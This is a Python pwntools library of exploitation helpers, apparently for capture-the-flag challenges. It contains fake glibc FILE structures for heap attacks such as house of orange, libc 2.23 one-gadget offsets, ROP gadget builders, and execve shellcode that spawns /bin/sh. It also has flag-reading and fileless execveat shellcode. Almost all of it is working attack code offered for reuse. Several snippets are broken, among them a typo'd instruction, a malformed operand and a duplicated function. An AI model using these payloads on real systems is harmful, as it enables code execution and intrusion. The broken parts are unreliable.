# -*- coding:utf-8 -*-
from pwn import *

def pack_file32(
        _flags = 0,
        _IO_read_ptr = 0,
        _IO_read_end = 0,
        _IO_read_base = 0,
        _IO_write_base = 0,
        _IO_write_ptr = 0,
        _IO_write_end = 0,
        _IO_buf_base = 0,
        _IO_buf_end = 0,
        _IO_save_base = 0,
        _IO_backup_base = 0,
        _IO_save_end = 0,
        _IO_marker = 0,
        _IO_chain = 0,
        _fileno = 0,
        _lock = 0,
    ):
    file_struct=p32(_flags) + \
                p32(_IO_read_ptr) + \
                p32(_IO_read_end) + \
                p32(_IO_read_base) + \
                p32(_IO_write_base) + \
                p32(_IO_write_ptr) + \
                p32(_IO_write_end) + \
                p32(_IO_buf_base) + \
                p32(_IO_buf_end) + \
                p32(_IO_save_base) + \
                p32(_IO_backup_base) + \
                p32(_IO_buf_end) +\
                p32(_IO_marker)+\
                p32(_IO_chain) + \
                p32(_fileno)
    file_struct=file_struct.ljust(0x48,'\x00')
    file_struct+=p32(_lock)
    file_struct=file_struct.ljust(0x94,'\x00')
    return file_struct

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = p32(_flags) + \
            p32(0) + \
            p64(_IO_read_ptr) + \
            p64(_IO_read_end) + \
            p64(_IO_read_base) + \
            p64(_IO_write_base) + \
            p64(_IO_write_ptr) + \
            p64(_IO_write_end) + \
            p64(_IO_buf_base) + \
            p64(_IO_buf_end) + \
            p64(_IO_save_base) + \
            p64(_IO_backup_base) + \
            p64(_IO_save_end) + \
            p64(_IO_marker) + \
            p64(_IO_chain) + \
            p32(_fileno)
    file_struct = file_struct.ljust(0x88, "\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, "\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, "\x00")
    return file_struct
    
def payload_IO_str_finish(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr,offset=-8):
    """
    house of orange
    溢出被free的unsortbin的结构
    offset为执行IO_str_jumps中的对应函数对应的偏移
    """
    payload = pack_file(_flags = 0, #prev size
                    _IO_read_ptr = 0x61, #smallbin4file_size
                    _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr,
                    _IO_write_base = 0,
                    _IO_write_ptr = 1,
                    _IO_buf_base = binsh_addr,
                    _mode = 0,
                    )
    payload += p64(_IO_str_jumps_addr+offset)
    payload += p64(0) # paddding
    payload += p64(system_addr)
    return payload

def payload_IO_str_overflow(_IO_str_jumps_addr,_IO_list_all_ptr,system,bin_sh_addr,i=0,offset=0):
    if i==0:
        bin_sh_addr+=5 #使用sh来使binsh的地址为偶数，防止溢出
    payload=pack_file(
    _IO_buf_end = (bin_sh_addr - 0x64) / 2,
    _IO_buf_base = 0,
    _IO_write_ptr=0xffffffffffff0000,
    _IO_write_base =0,
    _mode = 0,
    _IO_read_ptr = 0x61, 
    _IO_read_base = _IO_list_all_ptr-0x10, 
    _flags=0
    )
    payload+=p64(_IO_str_jumps_addr+offset)+p64(system)
    return payload

def payload_IO_str_overflow(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr,offset=4):
    """IO_list_all的值应当为可读可写，一般为file结构的结束地址即可（不是用于houseoforange）"""
    payload=pack_file32(
        _IO_buf_end = (binsh_addr - 0x64) / 2,
        _IO_write_base=1,
        _lock=_IO_list_all_ptr,
        _IO_read_base=0, #_IO_list_all_ptr-0x8,
        _IO_read_ptr = 0,#0x61, #未完待续，用于houseoforange
    )
    payload+=p32(_IO_str_jumps_addr+offset)+p32(system_addr)
    return payload

    
# libc 2.23
one=[0x45216, 0x4526a, 0xf02a4, 0xf1147, 0xcd0f3, 0xcd1c8, 0xf02b0, 0xf66f0]

def ioleak(is32=False):
    if is32:
        # 0x11 bytes
        return p32(0xfbad3887)+p32(0)*3+'\x00'
    else:
        # 0x21 bytes
        return p64(0xfbad3887)+p64(0)*3+'\x00'

def csu( ptr2retaddr, rdx, rsi, edi, last_ret,padding, is32=False,rbx=0, rbp=1):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call(a point like got)
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    # padding is stack padding after call [r12] --> will ret to some addr
    # 想要再次控制rop, [r12] 这个地址至少需要一个pop ret, 那么padding=0即可
    if not is32:
        payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(ptr2retaddr) + p64(rdx) + p64(rsi) + p64(edi)
        payload += p64(csu_front_addr)
        payload += '\xff' * padding
        payload += p64(last_ret)
        return payload
    else:
        # unsure :)
        payload = p32(csu_end_addr) + p32(rbx) + p32(rbp) + p32(ptr2retaddr) + p32(rdx) + p32(rsi) + p32(edi)
        payload += p32(csu_front_addr)
        payload += '\xff' * padding
        payload += p32(last_ret)
        return payload

def gedget1(addr,retaddr):
    # 这个gadget需要控制rbp和栈, 就可以实现花式栈溢出, 用加减法来写libc地址, 可结合csu食用
    # 位于_do_global_dtors_aux+8的位置
    # adc dword ptr [rbp+0x48],edx
    return p64(addr)+p64(0xdeadbeef)+p64(retaddr)

def gadget2(addr):
    # 这个gadget控制所有的寄存器, 但是需要首先控制一个寄存器
    # 测试环境为 rdi, 其他的自行fix
    # 位于libc中,大概 0x47b75 的位置(2.23), setcontext函数末尾
# .text:0000000000047B75                 mov     rsp, [rdi+0A0h]
# .text:0000000000047B7C                 mov     rbx, [rdi+80h]
# .text:0000000000047B83                 mov     rbp, [rdi+78h]
# .text:0000000000047B87                 mov     r12, [rdi+48h]
# .text:0000000000047B8B                 mov     r13, [rdi+50h]
# .text:0000000000047B8F                 mov     r14, [rdi+58h]
# .text:0000000000047B93                 mov     r15, [rdi+60h]
# .text:0000000000047B97                 mov     rcx, [rdi+0A8h]   
# .text:0000000000047B9E                 push    rcx
# .text:0000000000047B9F                 mov     rsi, [rdi+70h]
# .text:0000000000047BA3                 mov     rdx, [rdi+88h]
# .text:0000000000047BAA                 mov     rcx, [rdi+98h]
# .text:0000000000047BB1                 mov     r8, [rdi+28h]
# .text:0000000000047BB5                 mov     r9, [rdi+30h]
# .text:0000000000047BB9                 mov     rdi, [rdi+68h]
# .text:0000000000047BBD                 xor     eax, eax
# .text:0000000000047BBF                 retn
    # rcx为返回地址, rdi为可控指针
    return p64(addr+0x47b75)

def execve(is32=False,multi=0):
    
    multi="""
    xor esi, esi                  
    mul esi                       
    push rdx                        
    push rdx                        
    push rdx                        
    push rsp                       
    pop rbx                         
    ush rbx                        
    pop rdi                         
    mov dword [rdi], 0x6e69622f     
    mov dword [rdi+0x4], 0x68732f2f 
    jnz 0x1f                        
    mov al, 0x3b                  
    syscall                         
    xor ecx, ecx                   
    mov al, 0xb                     
    int 0x80      
    """
    if multi:
        return asm(multi,arch="amd64")
    # 20byte         
    code32="""
    xor    ecx,ecx
    push   0xb
    pop    eax
    push   ecx
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx,esp
    int    0x80
    """
    shellcode_sh_i386=asm(code32,arch="i386")
    # 22byte
    code64="""
    xor 	rsi,	rsi			
    push rsi
    mov 	rdi,	0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    mov al,0x3b
    cdq
    syscall
    """
    shellcode_sh_x64=asm(code64,arch="amd64")
    if is32:
        return shellcode_sh_i386
    else:
        return shellcode_sh_x64

def readflag(is32=False):
    # 可以将所有的mov指令转换为push pop减小shellcode大小
    if is32:
        code = """
        xor ecx,ecx
        mov eax,SYS_open
        call here
        .string "./flag"
        .byte 0
        here:
        pop ebx
        int 0x80
        mov ebx,eax
        mov ecx,esp
        mov edx,0x100
        mov eax,SYS_read
        int 0x80
        mov ebx,1
        mov ecx,esp
        mov edx,0x100
        mov eax,SYS_write
        int 0x80
        mov eax,SYS_exit
        int 0x80
        """
        # 65
        return asm(code,arch="i386")
    else:
        code = """
        xor rsi,rsi
        mov rax,SYS_open
        call here
        .string "/flag"
        here:
        pop rdi
        syscall
        mov rdi,rax
        mov rsi,rsp
        mov rdx,0x100
        mov rax,SYS_read
        syscall
        mov rdi,1
        mov rsi,rsp
        mov rdx,0x100
        mov rax,SYS_write
        syscall
        mov rax,SYS_exit
        syscall
        """
        return asm(code,arch="amd64")


def execveat():
    # 这个shellcode从文件读取输入,无文件执行从stdin输入到内存的文件
    code=shellcraft.pushstr("Q4n")+"""
    mov rax,319
    mov rdi,rsp
    xor rsi,rsi
    syscall
    mov rbx,rax
    loop:
    xor rdi.rdi
    mov rsi,rsp
    mov rdx,0x400
    xor rax.rax
    syscall
    cmp rax,0
    je go
    mov rdi,rbx
    mov rsi,rsp
    mov rdx,rax
    xor rax,rax
    inc rax

    syscall
    jmp loop
    go:
    mov rdi,rbx
    push 0
    mov rsi,rsp
    xor rdx,rdx
    xor r10,r10
    mov r8,0x1000
    mov rax,322
    syscall
    """
    return asm(code,arch="amd64")



def dlresolve(bin_path):
    print "warning: just a template"
    # from roputils import *
    # from pwn import process
    # from pwn import gdb
    # from pwn import context
    # from pwn import remote
    # r = process('./main')
    # context.log_level = 'debug'
    # rop = ROP(bin_path)
    # offset = 112
    # bss_base = rop.section('.bss')
    # # first: ROP chain
    # buf = rop.fill(offset)
    # # read the fake struct into memory
    # buf += rop.call('read', 0, bss_base, 100)
    # # used to call dl_Resolve(function_name, args_ptr)
    # buf += rop.dl_resolve_call(bss_base + 20, bss_base)
    # r.send(buf)
    # # second: write the fake struct into bss
    # buf = rop.string('/bin/sh')
    # buf += rop.fill(20, buf)
    # buf += rop.dl_resolve_data(bss_base + 20, 'system')
    # buf += rop.fill(100, buf)
    # r.send(buf)
